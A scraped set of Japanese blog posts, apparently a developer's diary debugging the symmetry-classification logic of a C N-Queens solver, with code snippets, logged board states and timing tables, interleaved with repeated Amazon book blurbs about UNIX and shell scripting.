そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-29T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-29-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-29-01-ani/","title":"NQueen日記 2022/08/29"},{"content":"8月18日 調べたところ、2辺が同じ場合は3辺目を比較する処理をコメントしていた\nコメントを外して実行したところ旧ロジックと同じ結果になった。\n旧ロジックに比べてまだ20%くらい遅い。\n今後以下をチューニングしていきたい。\n・ミラー処理を入れる（１行目右半分だけ実行する）\n・枝刈りを入れる（BOUND1,BOUND2）\n・symmetryの判定を05C/GCC12と同じにする\n・symmetryOpsの比較をビット計算に差し替える\n新ロジック実行結果\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14200 1788 0.11 13: 73712 9237 0.32 14: 365596 45771 1.00 15: 2279184 285095 3.37 16: 14772512 1847425 15.38 17: 95815104 11979381 1:19.15 旧ロジック実行結果\n７．CPUR 再帰 バックトラック＋ビットマップ＋対称解除法 N: Total Unique hh:mm:ss.ms 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.00 11: 2680 341 0.01 12: 14200 1788 0.03 13: 73712 9237 0.10 14: 365596 45771 0.34 15: 2279184 285095 1.53 16: 14772512 1847425 8.80 17: 95815104 11979381 55.56 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-18T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-18-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-18-01-ani/","title":"NQueen日記 2022/08/18"},{"content":"8月17日 新旧ロジックでn2,n4,n8判定の差分をロギングして比較してみた。\n以下が新ロジックだとn4だったが、旧ロジックだとn8だった\nt0:3,t1:5,l0:4,l1:2,b0:3,b1:5,r0:4,r1:6 t0:2,t1:6,l0:6,l1:2,b0:2,b1:6,r0:6,r1:4 t0:2,t1:6,l0:5,l1:2,b0:2,b1:6,r0:6,r1:2 t0:2,t1:6,l0:3,l1:7,b0:2,b1:6,r0:5,r1:7 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:5,r1:7 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:5,r1:2 t0:2,t1:6,l0:3,l1:5,b0:2,b1:6,r0:3,r1:7 t0:2,t1:5,l0:4,l1:7,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:4,l1:2,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:4,l1:2,b0:2,b1:5,r0:6,r1:2 t0:2,t1:5,l0:2,l1:7,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:6,r1:3 t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:6,r1:2 t0:2,t1:4,l0:5,l1:3,b0:2,b1:4,r0:5,r1:7 t0:2,t1:4,l0:5,l1:2,b0:2,b1:4,r0:5,r1:3 t0:2,t1:4,l0:3,l1:7,b0:2,b1:4,r0:5,r1:7 t0:2,t1:4,l0:3,l1:7,b0:2,b1:4,r0:5,r1:3 t0:2,t1:4,l0:2,l1:7,b0:2,b1:4,r0:5,r1:3 t0:1,t1:7,l0:6,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:5,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:5,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:4,l1:9,b0:1,b1:7,r0:7,r1:9 t0:1,t1:7,l0:4,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:6,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:5,r1:9 t0:1,t1:7,l0:2,l1:9,b0:1,b1:7,r0:4,r1:9 t0:1,t1:6,l0:6,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:5,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:5,l1:9,b0:1,b1:6,r0:6,r1:9 t0:1,t1:6,l0:3,l1:9,b0:1,b1:6,r0:7,r1:9 t0:1,t1:6,l0:3,l1:9,b0:1,b1:6,r0:5,r1:9 t0:1,t1:5,l0:6,l1:9,b0:1,b1:5,r0:7,r1:9 t0:1,t1:5,l0:4,l1:9,b0:1,b1:5,r0:7,r1:9 t0:1,t1:5,l0:4,l1:9,b0:1,b1:5,r0:6,r1:9 t0:1,t1:5,l0:2,l1:9,b0:1,b1:5,r0:6,r1:9 t0:1,t1:5,l0:2,l1:9,b0:1,b1:5,r0:4,r1:9 t0:1,t1:4,l0:5,l1:9,b0:1,b1:4,r0:7,r1:9 t0:1,t1:4,l0:3,l1:9,b0:1,b1:4,r0:7,r1:9 t0:1,t1:4,l0:3,l1:9,b0:1,b1:4,r0:5,r1:9 t0:1,t1:4,l0:2,l1:9,b0:1,b1:4,r0:5,r1:9 t0:1,t1:4,l0:2,l1:9,b0:1,b1:4,r0:3,r1:9 t0:1,t1:3,l0:4,l1:9,b0:1,b1:3,r0:6,r1:9 t0:1,t1:3,l0:3,l1:9,b0:1,b1:3,r0:4,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:6,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:4,r1:9 t0:1,t1:3,l0:2,l1:9,b0:1,b1:3,r0:3,r1:9 新ロジックだとtopとbottomが同じものをn4としていた。\n例えば以下の例だと\nt0:3,t1:5,l0:4,l1:2,b0:3,b1:5,r0:4,r1:6\ntopはt0:3,t1:5、bottomはb0:3,b1:5で1同じである。\nでも180度回転させて同じになるにはleftとrightも同じでなくてはならないのを忘れてた。\n例えばこんな感じのがn4になる\nt0:3,t1:5,l0:4,l1:6,b0:3,b1:5,r0:4,r1:6\nn4の判定にleft==rightも追加することにする。\n}else if(bottomSide_0==topSide_0 \u0026amp;\u0026amp; bottomSide_1==topSide_1){ printf(\u0026#34;sym:1:t0:%d,t1:%d,l0:%d,l1:%d,b0:%d,b1:%d,r0:%d,r1:%d\\n\u0026#34;,topSide_0,topSide_1,leftSide_0,leftSide_1,bottomSide_0,bottomSide_1,rightSide_0,rightSide_1); if(leftSide_0==rightSide_0\u0026amp;\u0026amp;leftSide_1==rightSide_1){ return 1; } return 2; }else{ 追加した結果n11まで数が合うようになった。\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.01 11: 2680 341 0.03 12: 14232 1792 0.11 13: 73792 9247 0.33 14: 365708 45785 1.06 15: 2279648 285153 3.49 n12から違うので調査したいと思う\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-17T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-17-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-17-01-ani/","title":"NQueen日記 2022/08/17"},{"content":"8月12日 この前と同じようにn10について新旧ロジックを比較して見た。\n新ロジックだけのルートは以下の2つだけだった。\nどちらも正解にはならなかった。\nt0:2,t1:5,l0:2,l1:5,b0:6,b1:3,r0:2,r1:5 9 8 7 6 5 4 3 2 1 0 ================================= 0| 0000000100 1| 0000100000 2| 1000000000 3| 0000000000 4| 0000000010 5| 0100000000 6| 0000000000 7| 0000000001 8| 0010000000 9| 0000001000 t0:2,t1:5,l0:2,l1:5,b0:6,b1:2,r0:2,r1:5 9 8 7 6 5 4 3 2 1 0 ================================= 0| 0000000100 1| 0000100000 2| 1000000000 3| 0000000001 4| 0000000000 5| 0000000000 6| 0000000000 7| 0000000000 8| 0000000010 9| 0000001000 n10については新旧UNIQUE数は同じでTOTAL数だけ違う\n旧ロジック　10: 724 92 0.01\n新ロジック　10: 720 92 0.01\n2,4,8 の振り分けも間違っているのかもしれない。\n2,4,8それぞれどこに何個振り分けられるかもロギングして比較する必要がありそう\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-12T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-12-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-12-01-ani/","title":"NQueen日記 2022/08/12"},{"content":"8月10日 比較して同じだった場合は反時計回りに90度回転させたもの同士を比較するようにしてみた。\n例えば 上2行と右2列が同じだった場合はそれぞれを反時計回りに90度回転させた左2列と上2行を比較してみた。\n//top == right left \u0026gt; top if((topSide_0==rightSide_0)\u0026amp;\u0026amp;(topSide_1==rightSide_1)){ if((leftSide_0\u0026gt;topSide_0)||((leftSide_0==topSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;topSide_1))){ return 3; } } //top == bottom left \u0026gt; right if((topSide_0==bottomSide_0)\u0026amp;\u0026amp;(topSide_1==bottomSide_1)){ if((leftSide_0\u0026gt;rightSide_0)||((leftSide_0==rightSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;rightSide_1))){ return 3; } } //top == left left \u0026gt; bottom if((topSide_0==leftSide_0)\u0026amp;\u0026amp;(topSide_1==leftSide_1)){ if((leftSide_0\u0026gt;bottomSide_0)||((leftSide_0==bottomSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;bottomSide_1))){ return 3; } } //top == mtop left \u0026gt; mleft if((topSide_0==mtopSide_0)\u0026amp;\u0026amp;(topSide_1==mtopSide_1)){ if((leftSide_0\u0026gt;mleftSide_0)||((leftSide_0==mleftSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mleftSide_1))){ return 3; } } //top == mright left \u0026gt; mtop if((topSide_0==mrightSide_0)\u0026amp;\u0026amp;(topSide_1==mrightSide_1)){ if((leftSide_0\u0026gt;mtopSide_0)||((leftSide_0==mtopSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mtopSide_1))){ return 3; } } //top == mbottom left \u0026gt; mright if((topSide_0==mbottomSide_0)\u0026amp;\u0026amp;(topSide_1==mbottomSide_1)){ if((leftSide_0\u0026gt;mrightSide_0)||((leftSide_0==mrightSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mrightSide_1))){ return 3; } } //top == mleft left \u0026gt; mbottom if((topSide_0==mleftSide_0)\u0026amp;\u0026amp;(topSide_1==mleftSide_1)){ if((leftSide_0\u0026gt;mbottomSide_0)||((leftSide_0==mbottomSide_0)\u0026amp;\u0026amp;(leftSide_1\u0026gt;mbottomSide_1))){ return 3; } } N8,N9は数が合うようになった。\nしかしN10以降は数がずれてる\u0026hellip;.\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 720 92 0.01 11: 2668 341 0.04 12: 14148 1792 0.12 13: 73516 9247 0.36 14: 364508 45785 1.09 15: 2273920 285153 3.77 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 